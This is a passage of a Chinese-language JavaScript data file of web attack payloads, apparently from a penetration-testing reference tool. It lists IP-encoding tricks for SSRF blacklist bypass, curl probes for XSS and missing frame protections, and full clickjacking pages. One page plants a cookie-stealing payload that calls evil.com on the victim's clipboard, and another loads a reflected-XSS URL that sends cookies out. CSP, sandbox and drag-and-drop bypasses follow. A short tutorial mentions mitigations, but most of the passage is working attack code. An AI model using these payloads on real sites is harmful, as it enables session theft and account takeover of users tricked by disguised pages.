http://3232235777  (= 192.168.1.1)

# 八进制IP
http://0177.0.0.1  (= 127.0.0.1)
http://0x7f.0.0.1  (= 127.0.0.1)

# 混合进制
http://0177.0x0.0.1
http://127.1  (省略零段)
http://127.0.1

# IPv6映射
http://[::1]
http://[::]  (= 0.0.0.0)
http://[::ffff:7f00:1]`,
            syntaxBreakdown: [
              { part: '# 十进制IP', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共14行', type: 'value' }
            ],
          description: '使用十进制、八进制、十六进制和IPv6映射等不同方式表示内网IP绕过黑名单检查' 
        }
      ]
    },
  {
    id: 'clickjacking-xss',
    name: '点击劫持+XSS',
    description: '将点击劫持与XSS攻击结合，先通过点击劫持触发XSS攻击向量获取更深层的控制',
    category: '点击劫持',
    subCategory: 'XSS',
    tags: ['clickjacking', 'xss'],
    prerequisites: ['目标存在XSS漏洞', '目标允许被iframe嵌套', 'XSS payload可被点击触发'],
    execution: [
      {
        title: '识别可利用的XSS和Clickjacking组合',
        command: `# 1. 检测iframe嵌套防护
curl -sI "http://target.com" | grep -i "x-frame-options\|frame-ancestors"

# 2. 检测已知XSS点
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# 3. 检测Self-XSS (需要用户交互)
curl -s "http://target.com/profile/edit" -d "bio=<img+src=x+onerror=alert(document.cookie)>"`,
        description: '同时检测目标的点击劫持和XSS漏洞',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'curl -sI', explanation: '获取响应头检测安全配置', type: 'command' },
          { part: 'grep -i', explanation: '不区分大小写搜索安全头', type: 'command' },
        ]
      },
      {
        title: 'Self-XSS + Clickjacking组合利用',
        command: `<html><head>
<style>
  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }
  .step { position:absolute; z-index:1; }
</style>
<script>
var step = 0;
function nextStep() {
  step++;
  if (step === 1) {
    // 第一步：诱导用户点击"个人资料编辑"按钮
    document.getElementById("msg").innerText = "Step 1: Click to claim reward!";
  } else if (step === 2) {
    // 第二步：诱导用户点击输入框
    document.getElementById("msg").innerText = "Step 2: Click to verify identity!";
  } else if (step === 3) {
    // 第三步：诱导粘贴(Ctrl+V)，执行XSS
    document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
    navigator.clipboard.writeText('<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">');
  }
}
</script></head>
<body onload="nextStep()">
  <h1 id="msg">Loading prize...</h1>
  <button class="step" onclick="nextStep()" style="top:200px;left:100px;">Next Step</button>
  <iframe src="http://target.com/profile/edit"></iframe>
</body></html>`,
        description: '利用多步骤点击劫持触发Self-XSS——先引导用户点击编辑按钮，再诱导粘贴XSS payload',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'navigator.clipboard.writeText', explanation: '通过JS将恶意payload写入剪贴板', type: 'command' },
          { part: 'onload="nextStep()"', explanation: '页面加载后自动开始攻击流程', type: 'value' },
          { part: 'opacity:0.0001', explanation: '隐藏目标iframe', type: 'value' },
        ]
      },
      {
        title: '反射型XSS + iframe嵌套利用',
        command: `<html><head>
<style>
  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }
</style></head>
<body>
  <h1>Free WiFi Login</h1>
  <p>Please click "Connect" to access free WiFi</p>
  <button style="padding:15px 40px; font-size:18px; margin-top:20px;">Connect</button>
  <!-- iframe加载含XSS的URL，按钮位置精确对齐触发XSS -->
  <iframe src="http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"></iframe>
</body></html>`,
        description: '将含有XSS payload的URL通过iframe加载，利用点击劫持触发需要用户交互的XSS',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'callback=<script>...', explanation: '利用反射型XSS参数注入恶意脚本', type: 'value' },
          { part: 'document.location=', explanation: '将用户cookie外带到攻击者服务器', type: 'command' },
        ]
      },
    ],
    tutorial: {
      overview: '点击劫持+XSS组合攻击将两种客户端漏洞结合使用。单独的Self-XSS通常影响有限(需要受害者自己在输入框中粘贴payload)，但与点击劫持结合后，攻击者可以通过多步骤引导使Self-XSS变为可远程利用的漏洞。',
      vulnerability: '1) 目标存在Self-XSS或反射型XSS漏洞 2) 目标未设置X-Frame-Options或CSP frame-ancestors 3) 两个漏洞单独利用价值有限，但组合后危害升级',
      exploitation: '利用流程：1) 发现Self-XSS漏洞点(如个人资料编辑页) 2) 确认目标允许iframe嵌套 3) 构造多步骤点击劫持页面 4) 通过clipboard API预置XSS payload 5) 引导用户完成"点击编辑-粘贴-提交"的操作链',
      mitigation: '1) 设置X-Frame-Options: DENY 2) 修复所有XSS漏洞(包括Self-XSS) 3) 对输入内容实施严格的HTML编码 4) 配置CSP限制内联脚本执行 5) 关键操作使用CSRF Token',
      difficulty: 'intermediate'
    },
      wafBypass: [
        { 
          title: 'CSP frame-ancestors绕过', 
          command: `<!-- 利用data: URI绕过CSP（旧浏览器） -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- blob: URI绕过 -->
<script>
var blob = new Blob(['<script>alert(1)<\\/script>'], {type: 'text/html'});
document.getElementById('frame').src = URL.createObjectURL(blob);
</script>

<!-- srcdoc属性绕过 -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>`,
          description: '利用data:/blob: URI和srcdoc属性绕过CSP中frame-ancestors指令对iframe内容的限制',
          syntaxBreakdown: [
            { part: '<script>', explanation: '脚本标签', type: 'tag' },
            { part: 'alert()', explanation: '弹窗函数', type: 'function' }
          ]
        },
        { 
          title: 'sandbox属性配置错误利用', 
          command: `<!-- sandbox allow-scripts允许执行JS -->
<iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
</iframe>

<!-- 利用allow-popups逃逸 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
</iframe>

<!-- allow-top-navigation + 点击劫持 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation-by-user-activation">
</iframe>`,
            syntaxBreakdown: [
              { part: '<!-- sandbox allow-scripts允许执行JS -->', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用sandbox属性中allow-scripts与allow-same-origin组合或allow-popups-to-escape-sandbox逃逸沙箱' 
        },
        { 
          title: '拖放劫持注入XSS', 
          command: `<!-- 拖放劫持将XSS payload注入目标页面 -->
<style>
#drag { position: absolute; z-index: 1; opacity: 0; }
#target { position: absolute; z-index: 0; }
</style>

<div id="drag" draggable="true"
  ondragstart="event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')">
  Drag me
</div>

<iframe id="target" src="https://target.com/page-with-editable-field"
  sandbox="allow-scripts allow-same-origin">
</iframe>`,
          description: '通过HTML5拖放API将XSS payload从攻击页面拖入目标iframe中的可编辑区域',
          syntaxBreakdown: [
            { part: '<img>', explanation: '图片标签', type: 'tag' },
            { part: 'onerror', explanation: '错误事件处理器', type: 'keyword' },
            { part: 'alert()', explanation: '弹窗函数', type: 'function' }
          ]
        }
      ]
    }

];

export default webPayloads;
